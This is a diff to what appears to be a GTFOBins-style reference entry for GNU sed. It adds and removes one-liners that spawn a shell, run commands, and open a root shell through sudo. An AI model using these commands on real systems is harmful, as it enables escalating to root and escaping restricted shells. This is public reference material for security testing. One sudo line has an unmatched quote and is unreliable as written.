@@ -3,6 +3,8 @@ functions:
   shell:
     - description: GNU version only. Also, this requires `bash`.
       code: sed -n '1e exec sh 1>&0' /etc/hosts
+    - description: GNU version only. The resulting shell is not a proper TTY shell.
+      code: sed e
   command:
     - description: GNU version only.
       code: sed -n "1e id" /etc/hosts
@@ -21,6 +23,4 @@ functions:
   sudo:
     - description: GNU version only. Also, this requires `bash`.
       code: sudo sed -n '1e exec sh 1>&0 /etc/hosts
-    - description: Spawn interactive root shell by leveraging e(pipe) command. GNU version only.
-      code: sudo sed e
 ---
